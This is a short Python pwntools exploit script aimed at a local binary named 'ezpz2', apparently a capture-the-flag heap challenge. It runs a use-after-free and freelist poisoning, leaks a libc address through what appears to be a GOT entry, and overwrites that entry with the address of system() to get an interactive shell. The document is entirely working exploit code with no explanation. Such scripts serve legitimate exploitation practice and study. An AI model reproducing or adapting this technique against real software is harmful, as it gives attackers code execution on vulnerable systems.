from pwn import *

global p
# context.log_level = 'debug'

# 0x804c590
def menu():
    p.recvuntil("refresh): ")

def create():
    log.info("Make: ")
    p.sendline("C")
    p.recvuntil("ID ")
    id = p.recvline()[:-1]
    log.info("Created: " + str(id))
    menu()
    return id

def edit(index, q):
    log.info("Edit: {}".format(index))
    p.sendline("S")
    p.recvuntil("id: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("question: ")
    p.sendline(q)
    menu()

def view(index):
    log.info("View: {}".format(index))
    p.sendline("A")
    p.recvuntil("id: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil(": '")
    fd = u32(p.recv(4))
    # print (hex(fd))
    menu()
    return fd

def kill(index):
    log.info("Kill: {}".format(index))
    p.sendline("d")
    p.recvuntil("id: ")
    p.sendline(str(index))
    menu()


p = process("./ezpz2")
create()
create()
kill(1)
kill(0)
addr1 = view(0)
print(hex(addr1))
target = addr1 - 56
print(hex(target))
edit(1, p32(target))
create()
create()
create()

edit(2, p32(0x804b02c))
putsLibc = view(4)
print("puts: "+ hex(putsLibc))
systemLibc = putsLibc -174400
edit(4, p32(systemLibc))
p.interactive()
# c = create()
# view(c)
